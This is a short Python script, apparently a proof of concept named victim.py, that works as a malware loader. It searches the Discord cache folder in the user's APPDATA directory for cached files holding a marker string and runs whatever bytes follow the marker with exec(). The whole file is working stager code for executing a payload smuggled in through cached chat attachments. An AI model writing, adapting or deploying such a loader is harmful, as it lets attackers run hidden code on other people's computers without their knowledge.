# victim.py
# Author: cs @KaliLincox
# Date: 01/06/2021

import os

DELIMITER = b'********'

cache_path = os.path.join(os.getenv('APPDATA'), 'discord', 'Cache')

for item in (x for x in os.listdir(cache_path) if x.startswith('f_')):
    with open(os.path.join(cache_path, item), 'rb') as file:
        buf = file.read()

    if DELIMITER in buf:
        payload_index_start = buf.rindex(DELIMITER) + len(DELIMITER)
        payload = buf[payload_index_start:]

        exec(payload)
        break
